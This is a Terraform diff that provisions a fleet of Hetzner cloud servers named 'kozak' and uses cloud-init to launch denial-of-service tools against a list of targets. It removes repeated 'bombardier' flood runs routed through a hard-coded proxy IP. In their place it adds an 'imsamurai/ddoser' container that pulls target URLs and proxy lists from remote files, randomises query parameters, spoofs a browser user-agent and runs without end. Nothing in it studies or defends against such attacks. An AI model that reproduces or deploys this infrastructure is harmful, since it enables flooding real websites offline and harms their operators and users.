@@ -1,12 +1,11 @@
 locals {
-  t = yamldecode(file("config.yml"))
-
-  # target array
-  t_array = flatten([for i in local.t.targets : [for j in range(tonumber(i.count)) : i.host]])
+  # t = yamldecode(file("config.yml"))
+  # # target array
+  # t_array = flatten([for i in local.t.targets : [for j in range(tonumber(i.count)) : i.host]])
 
   # location array 
   l_array = [
-    for i in range(length(local.t_array)) :
+    for i in range(var.kozak_count) :
     try(
       var.locations[i],
       var.locations[i - length(var.locations) * floor(i / length(var.locations))]
@@ -31,7 +30,7 @@ resource "hcloud_ssh_key" "cloud_ssh_key" {
 }
 
 resource "hcloud_server" "kozak" {
-  count       = length(local.t_array)
+  count       = var.kozak_count
   name        = "kozak-${count.index}"
   image       = var.os_type
   server_type = var.server_type
@@ -64,20 +63,6 @@ runcmd:
   - systemctl unmask docker.socket
   - systemctl start docker.service
   - systemctl start docker
-  - export http_proxy=http://91.221.17.220:8000
-  - export HTTP_PROXY=http://91.221.17.220:8000
-  - apt-get update -y
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
-  - docker run -d --rm alpine/bombardier -c 1000 -d 2h -l ${element(local.t_array, count.index)}
+  - docker run -d --ulimit nofile=100000:100000 imsamurai/ddoser --target-urls-file "${var.targets_file_url}" --concurrency 300 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}"
 EOF
 }
